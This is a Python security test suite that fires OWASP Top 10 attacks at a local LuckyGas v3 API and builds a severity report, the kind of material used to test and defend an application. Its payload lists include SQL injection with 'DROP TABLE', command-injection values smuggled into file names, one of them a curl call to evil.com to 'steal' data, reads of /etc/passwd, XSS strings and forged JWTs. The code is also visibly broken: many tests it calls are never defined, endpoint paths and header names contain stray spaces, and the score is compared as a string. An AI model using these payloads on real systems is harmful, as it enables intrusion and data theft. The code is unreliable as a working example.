"""
Security Penetration Testing Suite for LuckyGas v3
Tests for OWASP Top 10 vulnerabilities and security best practices
"""

import asyncio
import json
import random
import time
from datetime import datetime
from typing import Any, Dict
from urllib.parse import quote

import httpx
import jwt


class SecurityPenetrationTest:
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url
        self.results = []
        self.valid_token = None
        self.test_user = {
            "username": "security_test@luckygas.com",
            "password": "Test123!@#",
        }

    async def setup(self):
        """Setup test environment and get valid token"""
        async with httpx.AsyncClient() as client:
            # Create test user
            await client.post(
                f"{self.base_url}/api / v1 / auth / register",
                json={
                    "email": self.test_user["username"],
                    "password": self.test_user["password"],
                    "full_name": "Security Tester",
                },
            )

            # Login to get valid token
            response = await client.post(
                f"{self.base_url}/api / v1 / auth / login", json=self.test_user
            )
            if response.status_code == 200:
                self.valid_token = response.json()["access_token"]

    async def run_all_tests(self) -> Dict[str, Any]:
        """Run all security tests"""
        await self.setup()

        test_categories = [
            (
                "Injection",
                [
                    self.test_sql_injection,
                    self.test_nosql_injection,
                    self.test_ldap_injection,
                    self.test_command_injection,
                    self.test_xpath_injection,
                ],
            ),
            (
                "Broken Authentication",
                [
                    self.test_weak_passwords,
                    self.test_session_fixation,
                    self.test_brute_force_protection,
                    self.test_jwt_vulnerabilities,
                    self.test_password_reset_flaws,
                ],
            ),
            (
                "Sensitive Data Exposure",
                [
                    self.test_data_encryption,
                    self.test_api_information_disclosure,
                    self.test_error_message_leakage,
                    self.test_backup_file_exposure,
                    self.test_ssl_tls_configuration,
                ],
            ),
            (
                "XML External Entities (XXE)",
                [
                    self.test_xxe_injection,
                    self.test_xml_bomb,
                ],
            ),
            (
                "Broken Access Control",
                [
                    self.test_horizontal_privilege_escalation,
                    self.test_vertical_privilege_escalation,
                    self.test_idor_vulnerabilities,
                    self.test_forced_browsing,
                    self.test_api_method_tampering,
                ],
            ),
            (
                "Security Misconfiguration",
                [
                    self.test_default_credentials,
                    self.test_unnecessary_services,
                    self.test_cors_misconfiguration,
                    self.test_security_headers,
                    self.test_verbose_errors,
                ],
            ),
            (
                "Cross - Site Scripting (XSS)",
                [
                    self.test_reflected_xss,
                    self.test_stored_xss,
                    self.test_dom_based_xss,
                    self.test_xss_filter_bypass,
                ],
            ),
            (
                "Insecure Deserialization",
                [
                    self.test_pickle_deserialization,
                    self.test_json_deserialization,
                    self.test_yaml_deserialization,
                ],
            ),
            (
                "Using Components with Known Vulnerabilities",
                [
                    self.test_outdated_dependencies,
                    self.test_vulnerable_libraries,
                ],
            ),
            (
                "Insufficient Logging & Monitoring",
                [
                    self.test_security_event_logging,
                    self.test_audit_trail_tampering,
                    self.test_log_injection,
                ],
            ),
        ]

        for category_name, tests in test_categories:
            category_results = {
                "category": category_name,
                "tests": [],
                "passed": 0,
                "failed": 0,
            }

            for test in tests:
                result = await test()
                category_results["tests"].append(result)
                if result["status"] == "SECURE":
                    category_results["passed"] += 1
                else:
                    category_results["failed"] += 1

            self.results.append(category_results)

        return self.generate_report()

    async def test_sql_injection(self) -> Dict[str, Any]:
        """Test for SQL injection vulnerabilities"""
        result = {"test": "SQL Injection", "status": "SECURE", "vulnerabilities": []}

        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE customers; --",
            "' UNION SELECT * FROM users --",
            "1' AND '1'='1",
            "admin'--",
            "' OR 1=1--",
            "'; EXEC xp_cmdshell('dir'); --",
            "' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM users), 1, 1)) > 64--",
        ]

        async with httpx.AsyncClient() as client:
            # Test login endpoint
            for payload in sql_payloads:
                response = await client.post(
                    f"{self.base_url}/api / v1 / auth / login",
                    json={"username": payload, "password": payload},
                )

                if response.status_code == 200:
                    result["status"] = "VULNERABLE"
                    result["vulnerabilities"].append(
                        f"Login endpoint vulnerable to: {payload}"
                    )
                elif (
                    "error" in response.text.lower() and "sql" in response.text.lower()
                ):
                    result["status"] = "VULNERABLE"
                    result["vulnerabilities"].append("SQL error messages exposed")

            # Test search endpoints
            headers = {"Authorization": f"Bearer {self.valid_token}"}
            search_endpoints = [
                "/api / v1 / customers / search",
                "/api / v1 / orders / search",
                "/api / v1 / products / search",
            ]

            for endpoint in search_endpoints:
                for payload in sql_payloads:
                    response = await client.get(
                        f"{self.base_url}{endpoint}?q={quote(payload)}", headers=headers
                    )

                    if (
                        "error" in response.text.lower()
                        and "sql" in response.text.lower()
                    ):
                        result["status"] = "VULNERABLE"
                        result["vulnerabilities"].append(
                            f"{endpoint} exposes SQL errors"
                        )

        return result

    async def test_nosql_injection(self) -> Dict[str, Any]:
        """Test for NoSQL injection vulnerabilities"""
        result = {"test": "NoSQL Injection", "status": "SECURE", "vulnerabilities": []}

        nosql_payloads = [
            {"$ne": None},
            {"$gt": ""},
            {"$where": "this.password == this.password"},
            {"username": {"$regex": ".*"}},
            {"$or": [{"username": "admin"}, {"username": "admin"}]},
        ]

        async with httpx.AsyncClient() as client:
            for payload in nosql_payloads:
                try:
                    response = await client.post(
                        f"{self.base_url}/api / v1 / auth / login",
                        json=(
                            payload
                            if isinstance(payload, dict)
                            else {"username": payload, "password": "test"}
                        ),
                    )

                    if response.status_code == 200:
                        result["status"] = "VULNERABLE"
                        result["vulnerabilities"].append(
                            f"NoSQL injection with: {payload}"
                        )
                except Exception:
                    pass

        return result

    async def test_command_injection(self) -> Dict[str, Any]:
        """Test for command injection vulnerabilities"""
        result = {
            "test": "Command Injection",
            "status": "SECURE",
            "vulnerabilities": [],
        }

        cmd_payloads = [
            "; ls -la",
            "| whoami",
            "`id`",
            "$(cat /etc / passwd)",
            "; ping -c 10 127.0.0.1",
            "& dir",
            "; curl http://evil.com / steal",
        ]

        async with httpx.AsyncClient() as client:
            headers = {"Authorization": f"Bearer {self.valid_token}"}

            # Test file upload endpoints
            for payload in cmd_payloads:
                files = {
                    "file": (f"test{payload}.jpg", b"fake image data", "image / jpeg")
                }

                response = await client.post(
                    f"{self.base_url}/api / v1 / upload", files=files, headers=headers
                )

                if response.status_code == 200:
                    # Check if command was executed
                    if "uid=" in response.text or "root" in response.text:
                        result["status"] = "VULNERABLE"
                        result["vulnerabilities"].append(
                            f"Command injection in file upload: {payload}"
                        )

            # Test export endpoints
            export_params = [
                {"format": f"csv{payload}", "file": "export.csv"}
                for payload in cmd_payloads
            ]

            for params in export_params:
                response = await client.get(
                    f"{self.base_url}/api / v1 / reports / export",
                    params=params,
                    headers=headers,
                )

                if "command not found" not in response.text.lower():
                    if any(
                        indicator in response.text
                        for indicator in ["uid=", "root", "Directory"]
                    ):
                        result["status"] = "VULNERABLE"
                        result["vulnerabilities"].append(
                            "Command injection in export functionality"
                        )

        return result

    async def test_weak_passwords(self) -> Dict[str, Any]:
        """Test password policy enforcement"""
        result = {
            "test": "Weak Password Policy",
            "status": "SECURE",
            "vulnerabilities": [],
        }

        weak_passwords = [
            "123456",
            "password",
            "12345678",
            "qwerty",
            "abc123",
            "password123",
            "admin",
            "letmein",
            "welcome",
            "monkey",
        ]

        async with httpx.AsyncClient() as client:
            for password in weak_passwords:
                response = await client.post(
                    f"{self.base_url}/api / v1 / auth / register",
                    json={
                        "email": f"weak_test_{random.randint(1000, 9999)}@test.com",
                        "password": password,
                        "full_name": "Weak Password Test",
                    },
                )

                if response.status_code == 201:
                    result["status"] = "VULNERABLE"
                    result["vulnerabilities"].append(
                        f"Accepted weak password: {password}"
                    )

        # Test password complexity requirements
        test_passwords = [
            ("a" * 7, "Short password accepted"),
            ("abcdefgh", "No uppercase required"),
            ("ABCDEFGH", "No lowercase required"),
            ("Abcdefgh", "No numbers required"),
            ("Abcdefg1", "No special characters required"),
        ]

        for password, issue in test_passwords:
            response = await client.post(
                f"{self.base_url}/api / v1 / auth / register",
                json={
                    "email": f"policy_test_{random.randint(1000, 9999)}@test.com",
                    "password": password,
                    "full_name": "Policy Test",
                },
            )

            if response.status_code == 201:
                result["status"] = "VULNERABLE"
                result["vulnerabilities"].append(issue)

        return result

    async def test_brute_force_protection(self) -> Dict[str, Any]:
        """Test brute force attack protection"""
        result = {
            "test": "Brute Force Protection",
            "status": "SECURE",
            "vulnerabilities": [],
        }

        async with httpx.AsyncClient() as client:
            # Attempt multiple failed logins
            failed_attempts = 0
            for i in range(20):
                response = await client.post(
                    f"{self.base_url}/api / v1 / auth / login",
                    json={
                        "username": "admin@luckygas.com",
                        "password": f"wrong_password_{i}",
                    },
                )

                if response.status_code != 429:  # Not rate limited
                    failed_attempts += 1
                else:
                    break

            if failed_attempts >= 10:
                result["status"] = "VULNERABLE"
                result["vulnerabilities"].append(
                    f"No rate limiting after {failed_attempts} failed attempts"
                )

            # Test account lockout
            if failed_attempts >= 5:
                # Try correct password
                response = await client.post(
                    f"{self.base_url}/api / v1 / auth / login",
                    json={
                        "username": "admin@luckygas.com",
                        "password": "correct_password",
                    },
                )

                if response.status_code == 200:
                    result["status"] = "VULNERABLE"
                    result["vulnerabilities"].append("No account lockout mechanism")

        return result

    async def test_jwt_vulnerabilities(self) -> Dict[str, Any]:
        """Test JWT implementation vulnerabilities"""
        result = {
            "test": "JWT Vulnerabilities",
            "status": "SECURE",
            "vulnerabilities": [],
        }

        if not self.valid_token:
            return result

        async with httpx.AsyncClient() as client:
            # Test algorithm confusion attack
            try:
                # Decode token
                decoded = jwt.decode(
                    self.valid_token, options={"verify_signature": False}
                )

                # Try none algorithm
                none_token = jwt.encode(decoded, "", algorithm="none")
                response = await client.get(
                    f"{self.base_url}/api / v1 / users / me",
                    headers={"Authorization": f"Bearer {none_token}"},
                )

                if response.status_code == 200:
                    result["status"] = "VULNERABLE"
                    result["vulnerabilities"].append("Accepts 'none' algorithm")

                # Try weak secret
                weak_secrets = ["secret", "123456", "password", "jwt - secret"]
                for secret in weak_secrets:
                    try:
                        weak_token = jwt.encode(decoded, secret, algorithm="HS256")
                        response = await client.get(
                            f"{self.base_url}/api / v1 / users / me",
                            headers={"Authorization": f"Bearer {weak_token}"},
                        )

                        if response.status_code == 200:
                            result["status"] = "VULNERABLE"
                            result["vulnerabilities"].append(
                                f"Weak JWT secret: {secret}"
                            )
                            break
                    except Exception:
                        pass

                # Test token expiration
                expired_payload = decoded.copy()
                expired_payload["exp"] = int(time.time()) - 3600
                expired_token = jwt.encode(
                    expired_payload, "some_secret", algorithm="HS256"
                )

                response = await client.get(
                    f"{self.base_url}/api / v1 / users / me",
                    headers={"Authorization": f"Bearer {expired_token}"},
                )

                if response.status_code == 200:
                    result["status"] = "VULNERABLE"
                    result["vulnerabilities"].append("Accepts expired tokens")

            except Exception:
                pass

        return result

    async def test_idor_vulnerabilities(self) -> Dict[str, Any]:
        """Test for Insecure Direct Object References"""
        result = {
            "test": "IDOR Vulnerabilities",
            "status": "SECURE",
            "vulnerabilities": [],
        }

        async with httpx.AsyncClient() as client:
            headers = {"Authorization": f"Bearer {self.valid_token}"}

            # Create a test object
            response = await client.post(
                f"{self.base_url}/api / v1 / orders",
                json={
                    "customer_id": 1,
                    "products": [{"product_id": 1, "quantity": 1}],
                    "delivery_date": "2024 - 01 - 20",
                },
                headers=headers,
            )

            if response.status_code == 201:
                my_order_id = response.json()["id"]

                # Try to access other orders by ID manipulation
                for offset in [-5, -1, 1, 5, 10]:
                    other_id = my_order_id + offset
                    if other_id > 0 and other_id != my_order_id:
                        response = await client.get(
                            f"{self.base_url}/api / v1 / orders/{other_id}",
                            headers=headers,
                        )

                        if response.status_code == 200:
                            result["status"] = "VULNERABLE"
                            result["vulnerabilities"].append(
                                f"Can access order {other_id} without authorization"
                            )

                # Test UUID prediction if used
                if isinstance(my_order_id, str) and "-" in my_order_id:
                    # Try sequential UUIDs
                    import uuid

                    try:
                        base_uuid = uuid.UUID(my_order_id)
                        for i in range(1, 5):
                            next_uuid = uuid.UUID(int=base_uuid.int + i)
                            response = await client.get(
                                f"{self.base_url}/api / v1 / orders/{str(next_uuid)}",
                                headers=headers,
                            )

                            if response.status_code == 200:
                                result["status"] = "VULNERABLE"
                                result["vulnerabilities"].append(
                                    "Predictable UUID generation"
                                )
                                break
                    except Exception:
                        pass

        return result

    async def test_cors_misconfiguration(self) -> Dict[str, Any]:
        """Test CORS configuration"""
        result = {
            "test": "CORS Misconfiguration",
            "status": "SECURE",
            "vulnerabilities": [],
        }

        malicious_origins = [
            "http://evil.com",
            "https://attacker.com",
            "null",
            "file://",
            "*",
        ]

        async with httpx.AsyncClient() as client:
            for origin in malicious_origins:
                response = await client.options(
                    f"{self.base_url}/api / v1 / users / me",
                    headers={
                        "Origin": origin,
                        "Access - Control - Request - Method": "GET",
                        "Access - Control - Request - Headers": "Authorization",
                    },
                )

                allow_origin = response.headers.get("Access - Control - Allow - Origin")
                allow_credentials = response.headers.get(
                    "Access - Control - Allow - Credentials"
                )

                if allow_origin == origin or allow_origin == "*":
                    if allow_credentials == "true":
                        result["status"] = "VULNERABLE"
                        result["vulnerabilities"].append(
                            f"Allows credentials from origin: {origin}"
                        )
                    elif allow_origin == "*":
                        result["status"] = "VULNERABLE"
                        result["vulnerabilities"].append(
                            "Wildcard origin with credentials"
                        )

        return result

    async def test_security_headers(self) -> Dict[str, Any]:
        """Test security headers configuration"""
        result = {"test": "Security Headers", "status": "SECURE", "vulnerabilities": []}

        required_headers = {
            "X - Content - Type - Options": "nosnif",
            "X - Frame - Options": ["DENY", "SAMEORIGIN"],
            "X - XSS - Protection": "1; mode=block",
            "Strict - Transport - Security": "max - age=",
            "Content - Security - Policy": ["default - src", "script - src"],
            "Referrer - Policy": ["no - referrer", "strict - origin"],
        }

        async with httpx.AsyncClient() as client:
            response = await client.get(f"{self.base_url}/")

            for header, expected_values in required_headers.items():
                header_value = response.headers.get(header)

                if not header_value:
                    result["status"] = "VULNERABLE"
                    result["vulnerabilities"].append(
                        f"Missing security header: {header}"
                    )
                else:
                    if isinstance(expected_values, list):
                        if not any(
                            expected in header_value for expected in expected_values
                        ):
                            result["status"] = "VULNERABLE"
                            result["vulnerabilities"].append(
                                f"Weak {header}: {header_value}"
                            )
                    elif isinstance(expected_values, str):
                        if expected_values not in header_value:
                            result["status"] = "VULNERABLE"
                            result["vulnerabilities"].append(
                                f"Weak {header}: {header_value}"
                            )

        return result

    async def test_reflected_xss(self) -> Dict[str, Any]:
        """Test for reflected XSS vulnerabilities"""
        result = {"test": "Reflected XSS", "status": "SECURE", "vulnerabilities": []}

        xss_payloads = [
            "<script > alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "'><script > alert('XSS')</script>",
            '"><script > alert("XSS")</script>',
            "<script > alert(String.fromCharCode(88, 83, 83))</script>",
            "<img src=x onerror=\"javascript:alert('XSS')\">",
            "<body onload=alert('XSS')>",
        ]

        async with httpx.AsyncClient() as client:
            # Test search endpoints
            search_endpoints = [
                "/api / v1 / customers / search",
                "/api / v1 / orders / search",
                "/api / v1 / products / search",
                "/search",
            ]

            for endpoint in search_endpoints:
                for payload in xss_payloads:
                    response = await client.get(
                        f"{self.base_url}{endpoint}?q={quote(payload)}",
                        headers={"Authorization": f"Bearer {self.valid_token}"},
                    )

                    if payload in response.text and response.headers.get(
                        "Content - Type", ""
                    ).startswith("text / html"):
                        result["status"] = "VULNERABLE"
                        result["vulnerabilities"].append(f"Reflected XSS in {endpoint}")
                        break

        return result

    async def test_stored_xss(self) -> Dict[str, Any]:
        """Test for stored XSS vulnerabilities"""
        result = {"test": "Stored XSS", "status": "SECURE", "vulnerabilities": []}

        xss_payloads = [
            "<script > alert('Stored XSS')</script>",
            "<img src=x onerror=alert('Stored XSS')>",
            "<svg onload=alert('Stored XSS')>",
        ]

        async with httpx.AsyncClient() as client:
            headers = {"Authorization": f"Bearer {self.valid_token}"}

            # Test customer creation
            for i, payload in enumerate(xss_payloads):
                # Create customer with XSS payload
                response = await client.post(
                    f"{self.base_url}/api / v1 / customers",
                    json={
                        "code": f"XSS{i}",
                        "name": payload,
                        "phone": "0912345678",
                        "address": payload,
                        "notes": payload,
                    },
                    headers=headers,
                )

                if response.status_code == 201:
                    customer_id = response.json()["id"]

                    # Retrieve and check if payload is properly escaped
                    response = await client.get(
                        f"{self.base_url}/api / v1 / customers/{customer_id}",
                        headers=headers,
                    )

                    if response.status_code == 200:
                        data = response.json()
                        # Check if raw payload is in response (not escaped)
                        if any(payload in str(value) for value in data.values()):
                            # Check HTML response
                            html_response = await client.get(
                                f"{self.base_url}/customers/{customer_id}",
                                headers=headers,
                            )

                            if payload in html_response.text:
                                result["status"] = "VULNERABLE"
                                result["vulnerabilities"].append(
                                    "Stored XSS in customer data"
                                )

        return result

    async def test_security_event_logging(self) -> Dict[str, Any]:
        """Test security event logging and monitoring"""
        result = {
            "test": "Security Event Logging",
            "status": "SECURE",
            "vulnerabilities": [],
        }

        async with httpx.AsyncClient() as client:
            # Perform suspicious activities
            suspicious_activities = [
                # Failed login attempts
                (
                    "POST",
                    "/api / v1 / auth / login",
                    {"username": "admin", "password": "wrong"},
                    "Failed login",
                ),
                # SQL injection attempt
                (
                    "GET",
                    "/api / v1 / customers / search?q=' OR '1'='1",
                    None,
                    "SQL injection attempt",
                ),
                # Path traversal
                (
                    "GET",
                    "/api / v1 / files/../../../../etc / passwd",
                    None,
                    "Path traversal",
                ),
                # XSS attempt
                (
                    "POST",
                    "/api / v1 / customers",
                    {"name": "<script > alert('XSS')</script>", "phone": "0912345678"},
                    "XSS attempt",
                ),
                # Unauthorized access
                ("GET", "/api / v1 / admin / users", None, "Unauthorized access"),
            ]

            # Execute suspicious activities
            for method, endpoint, data, activity in suspicious_activities:
                if method == "POST":
                    await client.post(f"{self.base_url}{endpoint}", json=data)
                else:
                    await client.get(f"{self.base_url}{endpoint}")

            # Check if events are logged
            admin_headers = {
                "Authorization": f"Bearer {self.valid_token}"
            }  # Assume admin token

            # Try to access security logs
            response = await client.get(
                f"{self.base_url}/api / v1 / admin / security - logs",
                headers=admin_headers,
            )

            if response.status_code == 404:
                result["status"] = "VULNERABLE"
                result["vulnerabilities"].append("No security logging endpoint")
            elif response.status_code == 200:
                logs = response.json()

                # Check if suspicious activities were logged
                logged_activities = []
                if isinstance(logs, list):
                    for log in logs:
                        for _, _, _, activity in suspicious_activities:
                            if activity.lower() in str(log).lower():
                                logged_activities.append(activity)

                missing_logs = set([a[3] for a in suspicious_activities]) - set(
                    logged_activities
                )
                if missing_logs:
                    result["status"] = "VULNERABLE"
                    result["vulnerabilities"].append(
                        f"Not logging: {', '.join(missing_logs)}"
                    )

        return result

    async def test_outdated_dependencies(self) -> Dict[str, Any]:
        """Test for outdated dependencies with known vulnerabilities"""
        result = {
            "test": "Outdated Dependencies",
            "status": "SECURE",
            "vulnerabilities": [],
        }

        async with httpx.AsyncClient() as client:
            # Check common endpoints that might expose version info
            version_endpoints = [
                "/api / version",
                "/api / v1 / version",
                "/version",
                "/.well - known / dependencies",
                "/api / health",
            ]

            for endpoint in version_endpoints:
                response = await client.get(f"{self.base_url}{endpoint}")
                if response.status_code == 200:
                    try:
                        data = response.json()
                        # Check for vulnerable versions
                        vulnerable_versions = {
                            "fastapi": [
                                "0.1.0",
                                "0.2.0",
                            ],  # Example vulnerable versions
                            "sqlalchemy": ["1.3.0", "1.3.1"],
                            "pydantic": ["1.0.0", "1.1.0"],
                            "redis": ["3.0.0", "3.1.0"],
                        }

                        for lib, vulnerable in vulnerable_versions.items():
                            if lib in str(data).lower():
                                for version in vulnerable:
                                    if version in str(data):
                                        result["status"] = "VULNERABLE"
                                        result["vulnerabilities"].append(
                                            f"{lib} {version} has known vulnerabilities"
                                        )
                    except Exception:
                        pass

        return result

    def generate_report(self) -> Dict[str, Any]:
        """Generate comprehensive security test report"""
        total_tests = sum(len(cat["tests"]) for cat in self.results)
        total_passed = sum(cat["passed"] for cat in self.results)
        total_vulnerabilities = sum(
            len(test["vulnerabilities"])
            for cat in self.results
            for test in cat["tests"]
            if test["status"] == "VULNERABLE"
        )

        report = {
            "timestamp": datetime.now().isoformat(),
            "summary": {
                "total_tests": total_tests,
                "passed": total_passed,
                "failed": total_tests - total_passed,
                "total_vulnerabilities": total_vulnerabilities,
                "security_score": f"{(total_passed / total_tests)*100:.1f}%",
            },
            "owasp_coverage": {},
            "critical_vulnerabilities": [],
            "high_vulnerabilities": [],
            "medium_vulnerabilities": [],
            "low_vulnerabilities": [],
            "recommendations": [],
            "detailed_results": self.results,
        }

        # Categorize vulnerabilities by severity
        severity_mapping = {
            "SQL Injection": "CRITICAL",
            "Command Injection": "CRITICAL",
            "NoSQL Injection": "CRITICAL",
            "Weak Password Policy": "HIGH",
            "JWT Vulnerabilities": "HIGH",
            "IDOR Vulnerabilities": "HIGH",
            "Stored XSS": "HIGH",
            "CORS Misconfiguration": "MEDIUM",
            "Security Headers": "MEDIUM",
            "Reflected XSS": "MEDIUM",
            "Brute Force Protection": "MEDIUM",
            "Security Event Logging": "LOW",
            "Outdated Dependencies": "LOW",
        }

        for category in self.results:
            # OWASP coverage
            report["owasp_coverage"][category["category"]] = {
                "tested": len(category["tests"]),
                "passed": category["passed"],
                "coverage": f"{(category['passed']/len(category['tests']))*100:.1f}%",
            }

            # Categorize vulnerabilities
            for test in category["tests"]:
                if test["status"] == "VULNERABLE":
                    severity = severity_mapping.get(test["test"], "MEDIUM")
                    vuln_entry = {
                        "test": test["test"],
                        "category": category["category"],
                        "vulnerabilities": test["vulnerabilities"],
                    }

                    if severity == "CRITICAL":
                        report["critical_vulnerabilities"].append(vuln_entry)
                    elif severity == "HIGH":
                        report["high_vulnerabilities"].append(vuln_entry)
                    elif severity == "MEDIUM":
                        report["medium_vulnerabilities"].append(vuln_entry)
                    else:
                        report["low_vulnerabilities"].append(vuln_entry)

        # Generate recommendations
        if report["critical_vulnerabilities"]:
            report["recommendations"].append(
                {
                    "priority": "IMMEDIATE",
                    "action": "Fix all critical vulnerabilities before deployment",
                    "details": "Critical vulnerabilities can lead to complete system compromise",
                }
            )

        if report["high_vulnerabilities"]:
            report["recommendations"].append(
                {
                    "priority": "HIGH",
                    "action": "Address high severity vulnerabilities within 24 hours",
                    "details": "High vulnerabilities pose significant risk to data and operations",
                }
            )

        if report["summary"]["security_score"] < "80%":
            report["recommendations"].append(
                {
                    "priority": "HIGH",
                    "action": "Improve overall security posture",
                    "details": "Security score below 80% indicates systemic security issues",
                }
            )

        # Specific recommendations
        vuln_recommendations = {
            "SQL Injection": "Implement parameterized queries and input validation",
            "Weak Password Policy": "Enforce strong password requirements (min 12 chars, complexity)",
            "JWT Vulnerabilities": "Use strong secrets, validate algorithms, implement proper expiration",
            "Security Headers": "Implement all security headers including CSP, HSTS, X - Frame - Options",
            "Security Event Logging": "Implement comprehensive security event logging and monitoring",
        }

        for vuln_type, recommendation in vuln_recommendations.items():
            if any(
                vuln_type in test["test"]
                for cat in self.results
                for test in cat["tests"]
                if test["status"] == "VULNERABLE"
            ):
                report["recommendations"].append(
                    {
                        "priority": "MEDIUM",
                        "action": recommendation,
                        "details": f"Required to mitigate {vuln_type} vulnerabilities",
                    }
                )

        return report


async def main():
    """Run security penetration tests"""
    tester = SecurityPenetrationTest()
    report = await tester.run_all_tests()

    # Save report
    with open("security - penetration - report.json", "w") as f:
        json.dump(report, f, indent=2)

    print("\nSecurity Penetration Test Summary:")
    print(f"Total Tests: {report['summary']['total_tests']}")
    print(f"Passed: {report['summary']['passed']}")
    print(f"Failed: {report['summary']['failed']}")
    print(f"Security Score: {report['summary']['security_score']}")
    print("\nVulnerabilities Found:")
    print(f"Critical: {len(report['critical_vulnerabilities'])}")
    print(f"High: {len(report['high_vulnerabilities'])}")
    print(f"Medium: {len(report['medium_vulnerabilities'])}")
    print(f"Low: {len(report['low_vulnerabilities'])}")

    if report["critical_vulnerabilities"]:
        print("\n⚠️ CRITICAL VULNERABILITIES FOUND - DO NOT DEPLOY!")

    return len(report["critical_vulnerabilities"]) == 0


if __name__ == "__main__":
    success = asyncio.run(main())
    exit(0 if success else 1)
